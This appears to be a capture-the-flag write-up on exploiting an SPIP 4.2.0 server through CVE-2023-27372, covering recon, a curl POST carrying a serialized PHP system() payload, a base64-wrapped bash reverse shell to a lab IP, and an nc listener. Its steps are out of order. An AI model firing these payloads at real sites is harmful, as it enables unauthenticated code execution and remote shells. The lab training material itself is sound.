@@ -1,0 +1,69 @@
+1. External Reconnaissance (Nmap)
+Our entry point began with an nmap scan of the target IP.
+
+Open Ports: 22 (SSH) and 80 (HTTP).
+
+HTTP Fingerprinting: The web server on port 80 was identified as Apache, but further directory brute-forcing (using gobuster or dirsearch) revealed a /spip/ directory.
+
+CMS Analysis: Accessing /spip/login.php confirmed the target was running SPIP, an open-source CMS popular in French-speaking regions.
+
+2. Identifying the Vulnerability (CVE-2023-27372)
+Manual inspection of the SPIP headers (Composed-By: SPIP 4.2.0) indicated a version vulnerable to an unauthenticated Remote Code Execution via the password reset (oubli) function.
+
+3. The Encoding Challenge
+The vulnerability lies in a call to unserialize() on the oubli parameter. To exploit this, we couldn't simply send a bash command; we had to navigate three layers of encoding:
+
+Layer 1: PHP Serialization. The payload had to be a valid serialized object. We chose a serialized array a:1:{i:0;s:NN:"...";} to ensure the SPIP core logic would process it.
+
+Layer 2: Byte Precision. PHP's s:NN requirement meant we had to manually count the bytes of our PHP system() call. A single character mismatch (like a misplaced space) would cause the entire exploit to fail silently.
+
+Layer 3: URL Encoding. Because we were sending this via a POST request with curl, special characters like ?, >, and " needed to be properly handled to ensure they reached the PHP engine intact.
+
+4. Gaining the Foothold (User Flag)
+After several attempts to find a writable directory, we leveraged the Docker volume mount discovered in the SUID script. We knew that /home/think was shared between our restricted shell and the web server's container.
+
+The Winning Payload:
+
+Bash
+# Encoded payload to write the flag to a readable location
+curl -s -X POST "http://127.0.0.1/spip/spip.php?page=spip_pass" \
+-d "page=spip_pass&formulaire_action=oubli&formulaire_action_args=pwn&oubli=a:1:{i:0;s:55:\"<?php system(\"cat /home/think/user.txt > /dev/shm/user_flag\"); ?>\";}"
+By directing the output to /dev/shm/user_flag (a world-readable memory-backed filesystem), we bypassed the restrictive permissions on the home directory and captured the User Flag.
+
+Moving to Root
+Now that we have the User Flag and a working RCE, the "restrained" part of our shell is no longer an obstacle.
+
+Should we proceed by using the SPIP RCE to write an SSH key to /home/think/.ssh/authorized_keys? This would give us a full, unrestricted SSH shell as the think user, making the final root escalation much smoother.
+5. Automated Directory Enumeration
+With the target IP confirmed, we initiated a deep directory scan using gobuster and the big.txt wordlist.
+
+Command: gobuster dir -u http://10.48.186.173 -w /usr/share/wordlists/dirb/big.txt
+
+Discovery: The scan confirmed /spip/ (Status: 301), providing a clear target path for CMS-specific exploits.
+
+6. Initial Exploit Attempts
+We first attempted to use a known exploit script (51536.py) to verify the RCE. When the automated tool failed to provide a clean shell, we pivoted to a custom Python solution (solve.py) to manually handle the SPIP oubli parameter logic.
+
+7. Bypassing Restrictions with Base64 Encoding
+Directly injecting a bash reverse shell failed due to character interference within the serialized PHP string. To ensure the payload remained intact through the POST request and the unserialize() function, we used a Base64-encoded bash wrapper.
+
+Payload Construction:
+
+Original Command: bash -i >& /dev/tcp/192.168.148.149/80 0>&1
+
+Encoded String: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0OC4xNDkvODAgMD4mMQo=
+
+Final Serialized Payload:
+s:104:"<?php system('echo [BASE64_STRING] | base64 -d | bash'); ?>";
+
+8. Gaining the Initial Shell
+We set up a listener on port 80 (requiring sudo on the local machine) to catch the callback.
+
+Listener: sudo nc -lvnp 80
+
+Execution: Running python3 solve.py triggered a Read timed out error—a common and positive sign in RCE exploitation, indicating the server is busy executing our persistent reverse shell.
+
+Connection: A connection was received from the target, granting us a shell as www-data inside the Docker container 41c976e507f8.
+
+9. Environment Stabilization
+Upon entering the container, we found a limited environment (e.g., python3 was missing). We proceeded to navigate the /home/think/spip directory, confirming that we were indeed operating within the volume-mounted space identified earlier in the reconnaissance phase.
